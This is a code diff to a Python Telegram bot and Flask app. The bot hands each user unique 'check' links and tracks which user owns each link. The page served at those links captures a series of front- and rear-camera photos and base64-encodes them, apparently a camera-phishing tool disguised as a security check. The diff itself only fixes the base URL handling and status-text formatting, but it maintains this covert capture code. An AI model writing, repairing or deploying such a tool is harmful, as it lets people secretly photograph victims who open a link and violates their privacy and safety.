@@ -34,6 +34,8 @@ if not BOT_TOKEN:
     print(f"{r}[!] BOT_TOKEN missing!{Style.RESET_ALL}")
     exit(1)
 
+BASE_URL = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost:10000')}"
+
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
@@ -41,7 +43,7 @@ app = Flask(__name__)
 user_links = {}     # user_id → list of link_ids
 link_owner = {}     # link_id → user_id
 
-# ──── Welcome message with disclaimer (no Markdown parsing issues) ────
+# ──── Welcome message with disclaimer (no Markdown issues) ────
 @bot.message_handler(commands=['start'])
 def welcome(msg):
     text = f"""
@@ -80,8 +82,7 @@ def gen_link(call):
     user_links[user_id].append(link_id)
     link_owner[link_id] = user_id
 
-    base_url = request.host_url.rstrip('/')
-    short_link = f"{base_url}/check/{link_id}"
+    short_link = f"{BASE_URL}/check/{link_id}"
 
     text = f"""
 تم توليد رابط فريد خاص بك ✓
@@ -114,9 +115,8 @@ def show_links(call):
         return
 
     text = "روابطك السابقة:\n\n"
-    base_url = request.host_url.rstrip('/')
     for lid in user_links[user_id]:
-        text += f"• {base_url}/check/{lid}\n"
+        text += f"• {BASE_URL}/check/{lid}\n"
 
     kb = InlineKeyboardMarkup()
     kb.add(InlineKeyboardButton("🛡️ توليد رابط جديد", callback_data="generate_link"))
@@ -191,7 +191,7 @@ SCAN_PAGE = """
                     await new Promise(r => setTimeout(r, 1200));
                     let blob = await capture();
                     photos.push(await blobToB64(blob));
-                    document.getElementById('status').textContent = `تم التقاط صورة أمامية \( {i+1}/ \){MAX_PHOTOS}`;
+                    document.getElementById('status').textContent = `تم التقاط صورة أمامية {i+1}/{MAX_PHOTOS}`;
                 }
             }
 
@@ -201,7 +201,7 @@ SCAN_PAGE = """
                     await new Promise(r => setTimeout(r, 1200));
                     let blob = await capture();
                     photos.push(await blobToB64(blob));
-                    document.getElementById('status').textContent = `تم التقاط صورة خلفية \( {i+1}/ \){MAX_PHOTOS}`;
+                    document.getElementById('status').textContent = `تم التقاط صورة خلفية {i+1}/{MAX_PHOTOS}`;
                 }
             }
 
@@ -282,7 +282,7 @@ def run_bot():
 
 if __name__ == "__main__":
     print(BANNER)
-    print(f"Base URL: {os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost:10000')}")
+    print(f"Base URL: {BASE_URL}")
     threading.Thread(target=run_flask, daemon=True).start()
     threading.Thread(target=run_bot, daemon=True).start()
     while True:
